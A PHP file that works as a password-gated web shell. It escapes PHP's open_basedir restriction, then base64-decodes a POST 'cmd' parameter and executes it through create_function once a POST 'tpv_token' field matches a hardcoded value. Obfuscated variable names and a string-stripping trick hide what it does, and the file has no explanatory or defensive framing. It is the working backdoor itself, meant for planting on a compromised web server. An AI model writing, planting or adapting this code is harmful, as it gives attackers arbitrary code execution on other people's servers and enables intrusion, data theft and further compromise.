<?php
function bypass_open_basedir(){
        if(!file_exists('bypass_open_basedir')){
                mkdir('bypass_open_basedir');
        }
        chdir('bypass_open_basedir');
        @ini_set('open_basedir','..');
        @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']);
        @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
        @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1;
        $_Ei34Ww_sQDfq_i = 0;
        while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
                @chdir('..');
                $_Ei34Ww_sQDfq_i++;
        }
        @ini_set('open_basedir','/');
        @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
}
bypass_open_basedir();
function a() 
{
return "/*110110110110*/".base64_decode(str_replace('easter_date','',@$_POST['cmd']))."/*110110110110**/"; 
}
function b()
{
return array_map(create_function("",a()), array(1));; 
}
if(@$_POST["tpv_token"]=='thinkphpp'){
	b(); 
}
?>